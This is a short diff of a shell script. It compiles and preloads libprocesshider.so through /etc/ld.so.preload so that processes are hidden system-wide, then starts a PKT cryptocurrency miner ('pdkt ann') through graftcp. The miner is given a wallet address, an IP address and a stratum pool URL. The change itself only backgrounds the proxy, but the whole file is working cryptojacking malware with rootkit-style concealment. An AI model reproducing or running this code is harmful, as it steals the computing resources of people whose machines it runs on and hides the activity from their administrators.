@@ -42,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && ./pdkt ann -p pkt1qvt0ptnwke2jhqqw4dwmmr3n30lrmd3y68mntkq http://151.80.239.86 https://stratum.zetahash.com
+./graftcp/graftcp & ./pdkt ann -p pkt1qvt0ptnwke2jhqqw4dwmmr3n30lrmd3y68mntkq http://151.80.239.86 https://stratum.zetahash.com
